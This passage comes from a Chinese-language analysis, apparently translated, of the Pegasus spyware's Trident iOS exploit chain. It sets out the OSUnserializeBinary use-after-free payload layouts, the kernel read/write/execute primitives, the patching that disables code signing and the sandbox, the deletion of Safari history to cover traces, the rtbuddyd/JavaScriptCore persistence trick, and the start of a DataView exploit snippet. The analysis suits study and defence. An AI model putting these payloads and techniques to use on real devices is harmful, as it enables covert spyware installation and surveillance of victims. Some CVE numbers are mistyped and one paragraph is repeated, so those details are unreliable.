<p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p>
<h4 id="payload结构和内核插入（64位）-1"><a href="#payload结构和内核插入（64位）-1" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl <em>处理函数，最终也会导致</em></em> OSSerializer::serialize<strong>以32位相似方式执行。为建立执行原语，64位用到了</strong>net.inet.ip.dummynet.extract_heap*<em>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和</em>getattr*差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p>
<h4 id="建立内核读-写基元（32位）-1"><a href="#建立内核读-写基元（32位）-1" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p>
<p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p>
<p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p>
<pre><code>len = (key &amp; kOSSerializeDataMask);
...
switch ( kOSSerializeTypeMask &amp; key)
&#123;
    case kOSSerializeDictionary:
        o = newDict = OSDictionary::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeArray:
        o = newArray =OSArray::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeSet:
        o = newSet = OSSet::withCapacity(len);
        newCollect = (len!=0);
    case kOSSerializeObject;
        if(len&gt;=objsIdx) break;
        o = objsArray[len];
        o-&gt;retain();
        isRef = true;
        break;
&#125;</code></pre>
<p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p>
<p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p>
<pre><code>if (! isRef)
&#123;
        setAtIndex (objs, objsIdx, o);
        if ( !ok) break;
        objsIdx++;
&#125;</code></pre>
<p><strong>setAtIndex</strong>是一个宏，将对象（o）添加到objsArray。虽然iOS环境中存在更强大的数组对象，例如OSArray（会自动处理引用计数的数组容器），但<em>OSUnserializeBinary</em>对其已反序列化的对象的数组对象管理采用手动多一些的管理方式。反序列化后，通过调用o-&gt; release（）来将对象的引用计数清零，在大多数情况下将导致对象被释放。可能会在<em>kOSSerializeObject</em>对象中抛出异常。</p>
<p>由于<em>kOSSerializeObject</em>对象是一个表示被其他条目引用的对象，因此必须在序列化后保留该对象。因此，在反序列化期间，kOSSerializeObject对象将调用o-&gt; retain（），从而增加对象的引用计数并防止从内存中删除它。</p>
<p>序列化数据blob允许多次使用相同的密钥。 换句话说，有可能（直到iOS 9.3.1，在CVE-2016-1828中修复了重复密钥问题）使XML代码如下：</p>
<pre><code>&lt;dict&gt;
        &lt;key&gt;KEY1&lt;/key&gt;
        &lt;number&gt;1&lt;/number&gt;
        &lt;key&gt;KEY1&lt;/key&gt;
        &lt;string&gt;2&lt;/string&gt;
&lt;/dict&gt;</code></pre>
<p>上面的XML一旦序列化，将包含五个对象。第一个对象是字典容器（<code>&lt;dict&gt;</code>表示kOSSerializeDictionary对象），后跟表示键的符号（“KEY1”赋给kOSSerializeSymbol）及其数据对象（整数1赋给kOSSerializeNumber）。第四个属性指定另一个密钥对象，会再次分配给KEY1，现在这个属性是一个包含字符串“2”的字符串对象（kOSSerializeString）。作为反序列化过程的一部分，KEY1的重用导致接下来的对象会替换分配给KEY1的原始值。用新数据替换密钥便是<em>OSUnserializeBinary</em>容易受到攻击的地方。</p>
<p>如前所述，当对象被反序列化时，只要该对象不是kOSSerializeObject，该对象就存储在objsArray中以供之后引用。此存储是setAtIndex宏的结果，如下：</p>
<pre><code>#define setAtIndex(v, idx, o) \
        if (idx &gt;= v##Capacity) \
        &#123; \
                unint32_t ncap = v##Capacity+64; \
                typeof(v##Array)nbuf = (typeof (v##Array)) kalloc_container(ncap*sizeof(o)); \
                if (!nbuf) ok =false; \
                if(v##Array) \
                &#123; \
                        bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \
                        kfree(v##Array,v##Capacity * sizeof(o)); \
                &#125; \
                v##Array=nbuf; \
                v##Capacity=ncap; \
        &#125; \
        if (ok) v##Array[idx]=o;</code></pre>
<p>宏将扩展objsArray以容纳附加对象，并将对象分配到objsArray的末尾，而不通过o-&gt; retain（）调用增加其引用计数。此方法的问题在于，当第二个对象替换现有对象时（在我们的示例中，就是每当字符串对象替换KEY1的数字对象时），第一个对象被释放并随后被释放，但是指向现在释放的对象的指针存在于objsArray中。通常这只是一个糟糕的编程设计问题，但如果通过kOSSerializeObject条目引用该对象，则问题会变得更加复杂。如果kOSSerializeObject条目通过索引引用已释放对象的指针，则对o-&gt; retain（）的调用将尝试执行受攻击者控制的虚函数。</p>
<p>为了利用UAF漏洞，32Stage2必须控制已解除分配的内存位置，并放置一个自定义vtable，它将使retain条目指向自己选择的函数。安装自定义vtable需要访问两个已释放的相邻内存位置。由于在序列化过程中无法直接覆盖对象的vtable，通过分配然后释放两个内存位置，32Stage2可以使用OSData或OSString对象一次替换两个内存位置，其中一个内存位置包含恶意vtable。导致UAF漏洞的上述条件是CVE-2016-18284的结果，并且存在于9.0到9.3.1的iOS版本中。32Stage2通过使用以下payload来利用此漏洞，以便在iOS时钟处理程序中安装内核读/写原语。   </p>
<pre><code>[0x00] kOSSerailizeBinarySignature
[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10
[0x08] kOSSerailizeString | 4
[0x0C] &quot;sy2&quot;
[0x10] kOSSerailizeEndCollecton | kOSSerailizeArray | 0x10
[0x14] kOSSerailizeDictionary | 0x10
[0x18] kOSSerailizeSymbol | 4
[0x1C] &quot;sy1&quot;
[0x20] kOSSerailizeData | 0x14
[0x24] &quot;ffff\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;
[0x38] kOSSerailizeSymbol | 4
[0x3C] &quot;sy1&quot;
[0x40] kOSSerailizeEndCollecton | kOSSerailizeSymbol | 4
[0x44] &quot;sy1&quot;
[0x48] kOSSerailizeString | 0x1C
[0x4C] &#123;payload buffer&#125;
[0x68] kOSSerailizeString | 0x1C
[0x6C] &#123;payload buffer&#125;
[0x88] kOSSerailizeString | 0x1C
[0x8C] &#123;payload buffer&#125;
[0xA8] kOSSerailizeEndCollecton | kOSSerailizeObject | 5</code></pre>
<p>在payload中，32Stage2重用sy1密钥以通过UAF漏洞激活payload。</p>
<p>从iOS版本9.3.2开始，修补了CVE-2016-1828漏洞，这迫使需要一种不同的机制来安装内核读/写原语。但是，OSUnserializeBinary的kOSSerializeObject仍包含UAF漏洞。</p>
<p>理解这个概念的最简单方法是查看32Stage2生成的payload，以利用OSUnserializeBinary UAF漏洞。</p>
<p>对于iOS版本9.3.2至少9.3.3，payload采用以下形式：</p>
<pre><code>[0x00] kOSSerailizeBinarySignature
[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10
[0x08] kOSSerializeString | 4
[0x0C] &quot;sy2&quot;
[0x10] kOSSerializeData | 0x14
[0x14] &#123;payload buffer&#125;
[0x28] kOSSerializeEndCollecton | kOSSerializeObject | 1 </code></pre>
<p>虽然在结构上它们看起来有些不同，但最终它们都利用了UAF漏洞。在iOS 9.3.2及更高版本中使用的这种更简单的payload是最容易理解的。当OSUnserializeBinary开始反序列化payload的解析过程时，该函数将创建一个新的字典对象，偏移0x04处的运行结果。在词典中有两个无键对象。第一个对象是一个<strong>OSString</strong>对象，其值为<strong>sy2</strong>（分别在偏移量0x08和0x0C中指定）。在偏移量0x10处指定大小为0x14（20）字节的<strong>OSData</strong>对象。OSData对象包含payload缓冲区数据结构。由于对象是无键的，OSUnserializeBinary将用OSData对象替换OSString对象，但将指针留在objsArray中。由于OSString对象没有retain（）调用，OSString被释放，从而将两个内存数组放入空闲列表中（一个用于OSString对象本身，另一个用于与OSString对象关联的字符串）。</p>
<p>当OSUnserializeBinary解析kOSSerializeData时，将分配新的OSData对象，从而从空闲列表中消耗一个已释放的内存位置。当与kOSSerializeData关联的数据被复制到OSData对象中时，将为数据分配新的缓冲区，该缓冲区将消耗空闲列表中的剩余数据位置。此时，objsArray中的悬空指针已被OSData对象的数据替换。它是与OSData对象关联的数据，其中包含恶意payload，最终将给予32Stage2写访问内核权限，以便安装读/写原语。</p>
<p>无论iOS版本如何，恶意payload都包含相同的payload缓冲区。payload缓冲区是一个20字节的结构，由以下元素组成：</p>
<pre><code>[00] address of uaf_payload_buffer + 8
[04] &#123;uninitialized data from stack&#125;
[08] address of uaf_payload_buffer
[0C] static value of 20
[10] address of OSSerializer::serialize</code></pre>
<p>payload必须包含指向偏移量0x10处新保留函数的指针。32Stage2使用OSSerializer :: serialize函数作为替换保留。这种设计意味着payload的其余部分必须模拟OSSerializer对象的vtable。如先前在已植入的设备上建立读/写/执行原语所述，OSSerializer :: serialize函数将在所提供的vtable的偏移0x10处调用该函数，同时将vtable的偏移0x08和0x0C传递给被调用的函数。假设偏移量0x10设置为OSSerializer :: serialize，则会再次调用该函数，但第二次将调用偏移量0x08指定的vtable。此调用会导致一系列后续调用，最终导致调用 <strong>_copyin</strong>，这个函数替换实时和电池时钟的getattr处理程序，正如在之前植入的设备上建立读/写/执行原语步骤中所述。</p>
<p>在执行漏洞利用之后，如果受害者的手机是“iPhone4,1”，则控制之前生成的1000个线程的全局变量值将设置为-1以终止线程。</p>
<p>为验证电池时钟的getattr处理程序是否成功读取内核内存地址，将调用<em>clock_get _attributes</em>，并将读取位置指定为内核的基址。如果<em>clock_get _attributes</em>的结果不是魔术值<code>0xFEEDFACE</code>，则再次尝试。 第二次失败导致调用assert回调并终止32Stage2。</p>
<h4 id="建立内核读-写基元（64位）"><a href="#建立内核读-写基元（64位）" class="headerlink" title="建立内核读/写基元（64位）"></a>建立内核读/写基元（64位）</h4><p>在第二阶段的64位版本中利用了相同的底层漏洞。原则上，漏洞利用的结构非常类似。主要区别在于通过写入<strong>net.inet.ip.dummynet.extract _ heap</strong> sysctl处理程序来建立最终的执行原语。OSSerializer :: serialize的使用方式与32Stage2中的类似。然后使用在建立内核执行原语（32位）中描述的相同机制来实现任意代码执行（通过执行任意ROP链）。</p>
<h4 id="建立内核执行原语（32位）"><a href="#建立内核执行原语（32位）" class="headerlink" title="建立内核执行原语（32位）"></a>建立内核执行原语（32位）</h4><p>正如之前在Rooted Devices上安装内核访问处理程序中所解释的那样，实时时钟的getattr处理程序指向OSSerializer :: serialize，它允许clock_get_attributes的调用者将特制结构传递给OSSerializer :: serialize以便在内核空间中执行指令。要在内核空间内执行，用户区32Stage2进程必须具有以可靠的方式将数据传输到内核地址空间的方法。 32Stage2使用管道创建的管道集的方法来完成此任务。</p>
<p>在将电池时钟的新getattr处理程序建立为* _bufattr _cpx* 之后，32Stage2有一个可靠的方法将DWORD从内核地址空间读入用户空间。32Stage2使用此功能来查找存储在内核中的<strong>addrperm</strong>值。addrperm重新定义数据传入用户区时在内核中的偏移量，以便混淆内核中数据的真实位置。如果获得该值，可以将内核地址反混淆到其真实地址值。32Stage2从生成的管道集中调用读取管道的<strong>fstat</strong>，然后计算<strong>stat</strong>结构的位置与内核地址空间之间的差异。然后将该值存储在全局变量中，供必须访问内核内存以执行代码的函数使用。</p>
<p>每当32Stage2想要在内核中执行代码时，以下数据结构将写入生成的管道集中write pipe：</p>
<pre><code>[00] argument 1
[04] argument 2
[08] address of cpde execute</code></pre>
<p>为了调用数据偏移量8中指定的函数，另一个DWORD被预先添加到数据中并传递给实时时钟的getattr处理程序（通过OSSerializer :: serialize访问），它在调用要执行的函数地址之前将参数1放入R3和参数2放入R1。通过将未使用的DWORD添加到数据结构中，该数据块成为OSSerializer的vtable替代品。该技术用于32Stage2中的两个不同函数。 一个函数允许任意内核函数调用，另一个函数用于将DWORD值写入内核地址空间。</p>
<h4 id="修补内核以允许内核端口访问"><a href="#修补内核以允许内核端口访问" class="headerlink" title="修补内核以允许内核端口访问"></a>修补内核以允许内核端口访问</h4><p>由于能够在内核地址空间内读取，写入和执行任意位置，下一步是通过内核端口获得对内核的更直接访问。如果使用PID值0调用，则 **  _for_pid ** 会返回错误。为了绕过这种保护，第2阶段修改了<strong>task_for_pid</strong>中的四个不同位置。在开始修改<strong>task_for_pid</strong>之前，阶段2确定需要修该改的区域是否在可读取/执行的内存区域内。如果内存不可写，则第2阶段将直接修改内存区域的权限以允许写访问，然后使dcache无效并刷新数据和TLBs指令以确保内存区域进行权限更新。</p>
<p>修改<strong>task_for_pid</strong>以允许调用者获得内核的端口后， 在调用assert回调和退出之前，第2阶段将尝试通过调用<strong>task_for_pid（mach_task_self，0，＆port）</strong>来获取五次内核端口，每次尝试之间有100次毫秒延迟。</p>
<h2 id="阶段三：提权和实现越狱"><a href="#阶段三：提权和实现越狱" class="headerlink" title="阶段三：提权和实现越狱"></a>阶段三：提权和实现越狱</h2><p>本节介绍在第2阶段执行的最终步骤，以获取iPhone上的root访问权限，禁用代码签名，然后实现越狱。 此阶段利用最终的Trident漏洞，该漏洞会造成内核内存损坏导致越狱（CVE-2016-4656）。</p>
<h3 id="修改系统以提权"><a href="#修改系统以提权" class="headerlink" title="修改系统以提权"></a>修改系统以提权</h3><p>32Stage2的下一步是在受害者的手机上获得root访问权限。如果第2阶段进程没有以root用户身份运行（UID = 0），在非越狱手机上不可能以root运行，第2阶段会修补setreuid功能跳过对提权的检查。若对setreuid的修改完成，该函数最多被调用五次（每次调用之间有500ms的延迟），直到setreuid（0,0）返回成功。在五次尝试之后（或在成功的setreuid调用之后），修改后的setreuid会给出相反的结果。最后检查进程的用户值（UID）以确保它确实是root（0）。 如果函数getuid返回0以外的任何值，则调用assert并退出阶段2。</p>
<p>阶段2通过实时时钟<strong>clock_get_attributes</strong>调用内核函数<strong>kauth_cred_get_with_ref</strong>，以便接收主线程的凭证。在此之后，第2阶段将找到mac_policy_list，其中包含当前加载到iOS内核中的访问控制策略模块列表。阶段2检查列表，查找以名称“Seat”开头的模块，可参考“Seatbelt沙箱策略”。如果未找到策略模块，则阶段2调用断言回调并终止。但是，如果找到该模块，则会读取并修改<strong>mpc_field_off</strong>，以允许当前进程更大程度地控制受害者的iPhone。</p>
<p>因为可访问内核端口并且删除了将阻止第2阶段执行通常被沙箱策略阻止的权限操作的限制，阶段2不再需要实时时钟的getattr处理程序。为了确保将来对此处理程序的调用不会使手机崩溃，将修改getattr函数指针以指向指令：<br><code>BX LR</code><br>这个新的处理函数有效地将未来对实时时钟的getattr调用转换为NOP。这可能是为了确保将来调用getattr处理程序（通过某些其他进程）不会产生意外后果并导致内核崩溃。</p>
<h3 id="禁用代码签名"><a href="#禁用代码签名" class="headerlink" title="禁用代码签名"></a>禁用代码签名</h3><p>默认情况下，标准iPhone上的iOS将阻止未签名的代码通过正常方式运行，例如<code>execv</code>或系统调用。同样，通过将文件系统设置为只读，可以防止对根文件系统的修改。这些情况将阻止第2阶段执行越狱程序，并将阻止越狱程序（如果它激活）修改系统。第2阶段修改了几个内核函数和两个内核扩展（kext），以允许这些禁止的操作。第2阶段首先找到<code>com.apple.driver.AppleMobileFileIntegrity</code>和<code>com.apple.driver.LightweightVolumeManager</code>的kext。<code>com.apple.driver.AppleMobileFileIntegrity</code>（AMFI）扩展程序负责实施iOS的代码签名功能。<code>com.apple.driver.LightweightVolumeManager</code>扩展负责主存储设备的分区表。阶段2通过调用OSKextCopyLoadedKextInfo来定位每个扩展，该函数返回含有扩展信息的字典对象。在字典中的是当扩展被调用时的加载偏移量，阶段二通过添加一已知的偏移量将其放入内核地址中。</p>
<p>使用AMFI的内核地址，阶段2定位以下全局变量：<br><code>amfi_get_out_of_my_way</code><br><code>cs_enforcement_disable</code><br>这两个变量在设置好后会禁用AFMI并禁用代码签名。然后，阶段2设置另外两个全局变量：debug _ flags和DEBUGflag。 这两个变量允许对受害者的iPhone进行调试权限，进一步减少沙箱（SEATBELT）对设备施加的限制。</p>
<p>接下来，第2阶段修改内核函数<code>vm_map_enter</code>和<code>vm_map_protect</code>，以便在虚拟内存管理器中禁用代码签名验证（可以分配RWX区域）。在此之后，第2阶段修改LightweightVolumeManager中的<code>_mapForIO</code>函数，然后修改内核函数csops以禁用更多的代码签名保护。</p>
<h3 id="重新安装驱动器"><a href="#重新安装驱动器" class="headerlink" title="重新安装驱动器"></a>重新安装驱动器</h3><p>为了越狱设备，必须拥有根文件系统写权限。阶段2通过对<code>/ sbin / launchd</code>调用访问函数来测试根文件系统的可写性，以确定阶段2是否具有对根文件系统的写访问权。如果文件是只读的，则第2阶段修补内核函数<code>_ mac _ mount</code>以禁用保护策略，该策略阻止将文件系统重新安装为读/写，然后通过调用<code>mount(“hfs”, “/”, MNT _ UPDATE ,mountData)</code>将root文件系统重新安装为读/写，其中mountData指定<code>/ dev / disk0s1s1</code>设备。</p>
<p>如此编写使得它只能在iOS 9系列iPhone上运行，但代码存在表明它曾经在较旧的iOS版本上使用过。作为支持此声明的证据，在第2阶段重新安装根文件系统后会调用一个函数，如果它在iOS 7，iOS 8或iOS 9上运行，则修改其执行路径。根据iOS版本，函数在<code>/ bin / launchctl</code>（适用于iOS 7和8）或<code>/ bin / launchd</code>（适用于iOS 9）上调用<code>fsctl</code>。<code>fsctl</code>将修改低磁盘空间警告阈值以及极低磁盘空间警告阈值，分别将值设置为8192和8208。</p>
<h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>由于Safari中允许任意代码执行的漏洞，第2阶段被激活。作为第2阶段在实现越狱之前执行的最后一项活动之一，第2阶段尝试通过清理Safari中的历史记录和缓存文件来覆盖其感染向量。清除Safari浏览器历史记录和缓存文件的过程非常简单，并且特定于iOS版本。</p>
<p>对于iOS 8和iOS 9（如果未在iOS 9上运行，第2阶段将在开始时终止），将从受害者的iPhone中立即删除以下文件以删除浏览器和缓存信息：</p>
<pre><code>• /Library/Safari/SuspendState.plist
• /Library/Safari/History.db
• /Library/Safari/History.db-shm
• /Library/Safari/History.db-wal
• /Library/Safari/History.db-journal
• /Library/Caches/com.apple.mobilesafari/Cache.db
• /Library/Caches/com.apple.mobilesafari/Cache.db-shm
• /Library/Caches/com.apple.mobilesafari/Cache.db-wal
• /Library/Caches/com.apple.mobilesafari/Cache.db-journal
• (files in the directory) /Library/Caches/com.apple.mobilesafari/fsCachedData/</code></pre>
<p>对于iOS 7，将删除以下文件：</p>
<pre><code>• /Library/Caches/com.apple.mobilesafari/Cache.db
• /Library/Caches/com.apple.mobilesafari/Cache.db-shm
• /Library/Caches/com.apple.mobilesafari/Cache.db-wal
• /Library/Caches/com.apple.mobilesafari/Cache.db-journal</code></pre>
<p>最后调用<code>sync</code>，以确保将删除写入磁盘。</p>
<h3 id="下一阶段安装"><a href="#下一阶段安装" class="headerlink" title="下一阶段安装"></a>下一阶段安装</h3><p>再次给出使用最初针对较旧的iOS版本的代码的证据，主线程调用的下一个函数进行解压缩并将两个文件放到受害者的文件系统上。以下代码段说明了Stage 2如何确定越狱二进制文件在受害者设备上的位置：</p>
<pre><code>if ( ( unsigned int) ( majorVersion -8 ))
&#123;
    if ( majorVersion ==7 )&#123;
        pszJBFilenamePath = &quot;/bin/sh&quot;;
        if( flag )
            pszJBFilenamepath = &quot;/private/var/tmp/jb-install&quot;;
    &#125;
    else&#123;
        assert();
        writeLog(3, &quot;%.2s%5.5d\n&quot;, &quot;bh.c&quot;, 134);
        exit(-1);
        pszJBFilenamePath =0;
    &#125;
&#125;
else
&#123;
    pszJBFilenamePath = &quot;/sbin/mount_nfs.temp&quot;;
&#125;</code></pre>
<p>代码片段显示，对于iOS版本7，下一阶段二进制文件的安装路径是<code>/ bin / sh</code>或<code>/ private / var / tmp / jb-install</code>（如果flag为非零）。对于早于7的iOS版本，将调用断言回调并终止程序。 对于iOS 8及更高版本，安装路径指定为<code>/ sbin / mount _ nfs.temp</code>。</p>
<p>包含下一阶段二进制的数据blob的大小被验证为非零。如果大小为零，则发生断言回调并终止第2阶段。然后，阶段2使用<code>BZ2 _ *</code> API函数将数据解压缩为两个文件：第一个文件是下一个阶段的二进制文件，对于iOS 9，它存储在<code>/ sbin / mount _ nfs.temp</code>中。 第二个文件是配置文件，存储在<code>/ private / var / tmp / jb _ cfg</code>中。</p>
<p>在控制返回主线程之前，这两个文件的权限更改为<code>0755</code>（使文件可执行）。</p>
<p>Stage 2在终止之前调用的最终函数负责移动上一步骤中放下的二进制文件。对于iOS版本8和9，文件<code>/ sbin / mount _ nfs.temp</code>重命名为<code>/ sbin / mount _ nfs</code>。如果受害者手机上的iOS是iOS 9，则会在重命名操作之前尝试删除<code>/ sbin / mount _ nfs</code>。重命名文件后，调用assert回调函数，然后调用exit函数，终止Stage 2。</p>
<p>一旦执行返回主线程，第2阶段将以静默方式终止</p>
<h3 id="现有的越狱检测"><a href="#现有的越狱检测" class="headerlink" title="现有的越狱检测"></a>现有的越狱检测</h3><p>如前所述，Stage 2二进制文件以两种不同的模式运行。第一个已经讨论过，其构成了一个完整的iOS漏洞利用和越狱。 第二个是在已经越狱的系统上运行Stage 2二进制文件时所采用策略。在第二模式下，第2阶段只是利用现有的越狱后门来安装Pegasus特定的内核补丁。</p>
<p>为了确定设备是否已经越狱，第2阶段尝试利用常见的越狱后门获取进入iOS内核的有效机器端口。只需通过调用<code>task _ for _ pid</code>并将PID值设置为0来执行此检查。 修改<code>task _ for _ pid</code>是iOS越狱使用的常见后门机制，它使用户模式进程有直接内核内存访问的权力。iOS通常不允许使用PID为0的<code>task _ for _ pid</code>。如果<code>task _ for _ pid</code>返回有效的任务端口，Stage 2进程就可以提升对内核的访问权限，那么就可以放弃前面描述的权限提升步骤。</p>
<p>阶段2还检查<code>/ bin / sh</code>在不在。在未越狱手机上，这个二进制文件永远不应该存在。当阶段2检测到此二进制文件的存在时，它假定现有的越狱程序与Pegasus不兼容或者所有必需的内核补丁已经到位并且不需要进一步的操作。当在设备上存在<code>/ bin / sh</code>时，阶段2不用进行攻击直接退出即可。</p>
<h2 id="四：Pegasus持久性机制"><a href="#四：Pegasus持久性机制" class="headerlink" title="四：Pegasus持久性机制"></a>四：Pegasus持久性机制</h2><p>本节详细介绍了Pegasus通过Trident漏洞进行攻击后保留在设备上的持久性机制，并在每次设备重新启动时继续执行未签名的代码。</p>
<h3 id="Pegasus持久性机制"><a href="#Pegasus持久性机制" class="headerlink" title="Pegasus持久性机制"></a>Pegasus持久性机制</h3><p>Pegasus使用的持久性机制在每次设备启动时可靠地执行未签名的代码（并最终执行内核漏洞以再次越狱设备）依赖于两个不同问题的组合。</p>
<p>第一个问题是<code>plist</code>中存在<code>rtbuddyd</code>服务（在设备启动时启动）。请注意，在iOS 10之前，rtbuddyd存在于某些iPhone设备上，例如iPhone 6S，但不存在于<code>iPhone 6</code>等其他设备上。因此，任何可以复制到指定路径（<code>/ usr / libexec / rtbuddyd</code>）的已签名二进制文件都将在引导时使用plist中指定的参数（特别是“<code>--early-boot</code>”）执行。</p>
<pre><code>&lt;key&gt; rtbuddy&lt;/key&gt;&lt;dict&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;rtbuddy&lt;/string&gt;&lt;string&gt;--early-boot&lt;/string&gt;&lt;/array&gt;&lt;key&gt;PerformInRestore&lt;/key&gt;&lt;true/&gt;&lt;key&gt;RequireSucess&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;/usr/libexec/rtbuddy&lt;/string&gt;&lt;/dict&gt;</code></pre>
<p>由于此行为，系统上的任何已签名二进制文件都可以在引导时使用单个参数执行。通过在当前工作目录中创建名为<code>--early-boot</code>的符号链接，可以将任意文件作为第一个参数传递给已复制到<code>rtbuddyd</code>位置的任意已签名二进制文件。</p>
<p>此持久性机制中利用的第二个问题是JavaScriptCore二进制文件中的漏洞。Pegasus利用前面描述的方法，通过将文件复制到<code>/ usr / libexec / rtbuddyd</code>来执行jsc二进制文件（JavaScriptCore）。然后可以通过创建名为<code>--early-boot</code>的符号链接来执行任意JavaScript代码，该符号链接指向要在引导时执行的代码文件。然后Pegasus利用jsc二进制文件中的错误转换来执行未签名的代码并重新利用内核。</p>
<h3 id="JavaScriptCore内存损坏问题"><a href="#JavaScriptCore内存损坏问题" class="headerlink" title="JavaScriptCore内存损坏问题"></a>JavaScriptCore内存损坏问题</h3><p>该问题存在于JavaScript绑定的<code>setImpureGetterDelegate（）</code>中（由<code>functionSetImpureGetterDelegate</code>支持）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">EncodeJSValue JSC_HOST_CALL <span class="title">functionSetImpureGetterDelegate</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">JSLockHolder <span class="title">lock</span><span class="params">(exec)</span></span>;</span><br><span class="line">	JSValue base = exec-&gt;argument(<span class="number">0</span>)；</span><br><span class="line">	<span class="keyword">if</span>(!base.isObject())</span><br><span class="line">		<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">	JSValue delegate =exec-&gt;argument(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(!delegate.isObject())</span><br><span class="line">		<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">	ImpureGetter* impureGetter = jsCast&lt;ImpureGetter*&gt;(asObject(base.asCell()));</span><br><span class="line">	impureGetter-&gt;setDelegate(exec-&gt;vm(), asObject(delegate.asCell()));</span><br><span class="line">	<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个绑定有两个参数：第一个是ImpureGetter，第二个是将被设置为ImpureGetter delegate的通用JSObject。这个问题是由于缺乏验证，JSObject作为第一个参数实际上是一个格式正确的ImpureGetter。当另一个对象类型作为第一个参数传递时，对象指针将不正确地向下转换为ImpureGetter指针。</p>
<p>随后，当通过<code>setDelegate（)</code>设置<code>m_delegate</code>时，指向作为第二个参数传递的JSObject的指针将写入与<code>m_delegate</code>对齐的偏移量（16个字节到提供的对象中）。此问题可用于创建一个原语，允许将指向任意JSObject的指针写入16个字节到任何其他JSObject中。</p>
<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>Pegasus利用此问题在iOS应用程序执行时实现未签名代码执行。为了获得对执行流程的控制，该攻击利用了许多<code>DataView</code>对象。使用<code>DataView</code>是因为它们提供了一种简单的机制来读取和写入向量中的任意偏移量。DataView对象在16字节偏移处有一个指向缓冲区的指针。利用这些损坏的DataView对象，漏洞利用程序安装获取任意本机代码执行权所需的工具 - 即读/写原语以及暴露任意JavaScript对象地址。完成此设置后，漏洞利用程序就可以创建包含本机代码payload的可执行映射。 以下部分详细介绍了此过程的各个阶段。</p>
<h4 id="获取任意读-写原语"><a href="#获取任意读-写原语" class="headerlink" title="获取任意读/写原语"></a>获取任意读/写原语</h4><p>可以使用以下代码片段获取用于DataView对象的任意偏移量的读/写原语。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer(<span class="number">0x20</span>);</span><br><span class="line">var dataview_init_rw = <span class="keyword">new</span> DataView(dummy_ab);</span><br><span class="line">...</span><br><span class="line">var dataview_rw = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDalagate(dataview_init_rw, dataview_rw);</span><br></pre></td></tr></table></figure>
